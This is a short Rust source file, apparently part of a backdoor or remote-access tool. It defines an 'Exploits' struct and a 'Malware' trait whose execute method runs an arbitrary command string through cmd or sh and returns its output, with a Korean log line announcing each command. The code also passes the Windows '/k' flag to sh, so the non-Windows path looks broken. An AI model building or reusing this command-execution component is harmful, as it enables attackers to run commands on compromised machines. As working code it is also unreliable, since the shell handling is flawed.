use std::process::{Command};

#[derive(Debug)]
pub struct Exploits {
    exploit_input: Vec<u8>,
    exploit_output: Vec<u8>,
    shell: Command
}

impl Exploits {
    pub fn default() -> Exploits {
        Exploits {
            exploit_input: vec![],
            exploit_output: vec![],
            shell: Exploits::shell()
        }
    }

    pub fn shell() -> Command {
        if cfg!(target_os = "windows") { Command::new("cmd") }
        else { Command::new("sh") }
    }
}

pub trait Malware {
    fn execute(&mut self) -> Vec<u8>;
    fn command(&mut self, command:Vec<u8>) -> Exploits;
}

impl Malware for Exploits {
    fn execute(&mut self) -> Vec<u8> {

        let exploit_input = match String::from_utf8(self.exploit_input.clone()) {
            Ok(r) => r,
            Err(_) => "".to_string()
        };

        println!("명령 : {} 실행", exploit_input);

        let exploit_output =
            self.shell
                .args(["/k", &exploit_input])
                .output()
                .expect("failed to execute process");

        self.exploit_output = match exploit_output.stdout.is_empty() {
            true => exploit_output.stderr,
            false => exploit_output.stdout
        };

        self.exploit_output.clone()
    }

    fn command(&mut self, command:Vec<u8>) -> Exploits{
        Exploits {
            exploit_input: command,
            exploit_output: vec![],
            shell: Exploits::shell(),
        }
    }
}
